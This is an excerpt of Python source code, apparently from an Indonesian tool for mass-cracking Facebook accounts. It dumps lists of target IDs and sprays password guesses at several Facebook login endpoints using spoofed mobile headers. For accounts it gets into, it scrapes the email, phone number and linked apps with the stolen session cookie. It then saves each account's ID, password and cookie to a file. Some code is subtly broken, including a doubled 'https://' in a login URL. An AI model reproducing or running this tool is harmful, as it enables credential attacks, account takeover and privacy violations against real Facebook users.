...
""",title=f"{P2}Version {H2}3,5.1{P2}",subtitle=f"{H2}{Authorrrr}{P2}",width=70,style=f"{color_panel}"))
cookie=[]
...
[{color_text}02{P2}]. Crack Public/Massal   [{color_text}06{P2}]. Cek Account
[{color_text}03{P2}]. Crack File            [{color_text}07{P2}]. Crack Group\n[{color_text}04{P2}]. Crack gmail           [{color_text}08{P2}]. Dump ID""",width=70,padding=(0,7),style=f"{color_panel}"));prints(nel(f'{P2}Ketik "{H2}bot,exit,bug{P2}" jika ingin menggunakan{P2}',title=f'{H2}{jam} - {Iplu}{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
...
def dump_massal():
	...
	try:
		#print('')
		#print(f'[+] Total ID : {PI}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		prints(nel(f'{P2}unstable signal {P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		back()
...
def setting():
	...
	if hu in ['1','01']:
		...
		exit()
	prints(nel(f'{P2}[{color_text}01{P2}]. Login site m.facebook.com [ [green]Link sakti[white] ]\n[{color_text}02{P2}]. Login site free.facebook.com [ [green]Validate[white] ]\n[{color_text}03{P2}]. Login site mbasic.facebook.com [ [green]Validate[white] ]\n[{color_text}04{P2}]. Login site m.facebook.com [ [red]Reguler[white] ]\n[{color_text}05{P2}]. Login site free.facebook.com [ [red]Reguler[white] ]\n[{color_text}06{P2}]. Login site mbasic.facebook.com [ [red]Reguler[white] ]\n[{color_text}07{P2}]. Login site m.facebook.com [ [red]Async[white] ]\n{P2}[{color_text}08{P2}]. Login site touch.facebook.com [ [green] Async[white] ]\n{P2}[{color_text}99{P2}]. Login site Lainya [ [green]Terbaru ] {P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	#xxkontol=[]
	...
	if hc in ['1','01']:
		...
		prints(nel(f'{P2}{P2}[{color_text}01{P2}]. Login site Vidio\n{P2}[{color_text}02{P2}]. Login site Iflix\n{P2}[{color_text}03{P2}]. Login site bilibili\n{P2}[{color_text}04{P2}]. Login site Wetv\n{P2}[{color_text}05{P2}]. Login site Webnovel\n{P2}[{color_text}06{P2}]. Login site Trun\n{P2}[{color_text}07{P2}]. Login site Iphone\n{P2}[{color_text}08{P2}]. Login site Prod\n{P2}[{color_text}09{P2}]. Login site Nokia\n{P2}[{color_text}10{P2}]. Login site capcut{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		hh = input('[+] Pilih : ')
		if hh in ['01','1']:
			method.append('vidio')
		elif hh in ['02','2']:
...
def posturl():
    url = " "
    nokia = f"https://nokia.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110"
    return nokia
###------------[ CEK APK ]-------------###
"""
WARNA TEKS
...
def apk_activ(kuki,head_pro):
	...
	aktif = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",headers=head_pro,cookies={"cookie": kuki}).text
	soup = par(aktif, "html.parser")
	print("-"*75)
	ayu = tree.add(f"{PI}Aplikasi Active{PI}")
	for ah in soup.find_all("h3"):
		if "Ditambahkan" in ah.text:
			ayu.add(f"{AC}{str(ah.text).replace(f'Ditambahkan',f' {PI}Ditambahkan')}")
	inactiv(tree,kuki)
def inactiv(tree,kuki):
	head_pro = {'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}
	inactiv = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",headers=head_pro,cookies={"cookie": kuki}).text
	siu = par(inactiv, "html.parser")
	oke = tree.add(f"{B}Aplikasi Kedaluwarsa:{PI}")
	for ina in siu.find_all("h3"):
		if "Kedaluwarsa" in ina.text:
			oke.add(f"{AT}{str(ina.text).replace('Kedaluwarsa',f' {k}Kedaluwarsa')}{PI}")
	hapus(tree,kuki,head_pro)
def hapus(tree,kuki,head_pro):
	link1 = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed",headers=head_pro,cookies={"cookie": kuki}).text
	html = par(link1, "html.parser")
	oke = tree.add(f"{m}Aplikasi Terhapus:{PI}")
	for i in html.find_all("h3"):
		if "Dihapus" in i.text:
			oke.add(f"{AB}{str(i.text).replace('Dihapus',f' {AU}Dihapus')}{PI}")    
###----------[ ASYNC ]----------###
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					try:
						...
						tgl = '_'
					try:
						mal = ses.get("https://mbasic.facebook.com/settings/email",cookies={"cookie":kuki})
						mel = par(mal.text, "html.parser")
						mail = re.findall('\<span class="s t">(.*?)</span>', str(mel))[0]
					except:
						mail = '_'
					tree = Tree(f"  ")
					tree.add(f"\r[green]{idf}|{nmf}[white] ")
					tree.add(f"\r[green]{teman}[white] ")
					tree.add(f"\r[green]Nomor [white]:[green] ({nomer})[white] ")
					tree.add(f"\r[green]Email [white]:[green] ({mail})[white] ")
					tree.add(f"\r[green]Tanggal [white]:[green] ({tgl})[white] ")
					tree.add(f"\r[green]{ua}[white] ").add(f"\r[green]{kuki}[white] ")
					Buat(tree)
...
def Asepitgans_Xd(idf,pwv,nmf):
	...
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Async {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	ses = requests.Session()
...
def crackdatef(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen3)
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]Mobile [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)}')
	prog.advance(des)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
...
'bi_xrwh': 0
			...
			headers = {'Host': 'https://m.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.latest.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://https://m.facebook.com//login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
				...
				if 'no' in taplikasi:
					...
					tree.add(f"\r[green]Email [white]:[green] ({mail})[white] ")
					tree.add(f"\r[green]Tanggal [white]:[green] ({tgl})[white] ")
					tree.add(f"\r[gray]{ua}[white] ").add(f"\r[green]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
